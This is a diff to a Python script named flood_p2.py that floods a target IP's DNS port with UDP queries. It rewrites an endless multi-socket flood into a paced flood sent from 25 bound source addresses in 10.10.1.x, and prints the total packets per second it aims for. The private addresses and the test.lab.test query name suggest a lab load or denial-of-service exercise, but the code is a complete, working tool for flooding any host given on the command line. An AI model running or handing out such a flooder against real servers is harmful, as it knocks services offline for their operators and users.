@@ -1,34 +1,55 @@
 import socket
-import time
 import sys
+import time
 
-def main():
-    if len(sys.argv) < 3:
-        print("Usage: python3 flood_p2.py <target_ip> <num_sources>")
-        sys.exit(1)
-    
-    target_ip = sys.argv[1]
-    num_sources = int(sys.argv[2])
+if len(sys.argv) != 3:
+    print("Usage: python3 flood_p2.py <target_ip> <rate_per_source>")
+    sys.exit(1)
 
-    dns_query = b'\x56\x78\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' \
-                b'\x07example\x03com\x00\x00\x01\x00\x01'
+target_ip = sys.argv[1]
+rate = int(sys.argv[2])
 
-    socks = []
-    for _ in range(num_sources):
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        socks.append(s)
+if rate <= 0:
+    sys.exit("Rate must be positive")
 
-    print(f"[*] Starting P2 Distributed Flood towards {target_ip}:53 using {num_sources} channels...")
-    
-    try:
-        while True:
-            for s in socks:
-                s.sendto(dns_query, (target_ip, 53))
-            time.sleep(0.001)
-    except KeyboardInterrupt:
-        print("\n[*] Stopped P2 flood.")
-        for s in socks:
-            s.close()
+sources = [f"10.10.1.{i}" for i in range(101, 126)]
 
-if __name__ == '__main__':
-    main()
+query = (
+    b"\x12\x34\x01\x00\x00\x01\x00\x00"
+    b"\x00\x00\x00\x00\x04test\x03lab\x04test"
+    b"\x00\x00\x01\x00\x01"
+)
+
+sockets = []
+
+for source in sources:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind((source, 0))
+    sockets.append(sock)
+
+interval = 1.0 / rate
+next_send = time.monotonic()
+count = 0
+
+print(f"Sources: {len(sockets)}")
+print(f"Rate per source: {rate} pps")
+print(f"Target aggregate rate: {len(sockets) * rate} pps")
+
+try:
+    while True:
+        for sock in sockets:
+            sock.sendto(query, (target_ip, 53))
+            count += 1
+
+        next_send += interval
+        delay = next_send - time.monotonic()
+
+        if delay > 0:
+            time.sleep(delay)
+
+except KeyboardInterrupt:
+    print(f"\nPackets sent: {count}")
+
+finally:
+    for sock in sockets:
+        sock.close()
